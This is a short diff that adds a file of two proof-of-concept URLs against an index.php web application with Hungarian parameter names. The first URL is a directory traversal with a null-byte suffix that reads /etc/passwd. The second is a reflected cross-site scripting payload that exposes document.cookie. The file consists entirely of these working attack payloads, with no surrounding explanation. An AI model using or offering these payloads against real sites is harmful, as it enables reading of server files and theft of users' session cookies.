@@ -1,0 +1,3 @@
+http://www.example.com/index.php?param=1&nyelv_id=4&mappa=../../../../../../../etc/passwd%00
+
+http://www.example.com/index.php?param=1&lap=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&bejelentkezes=nincs
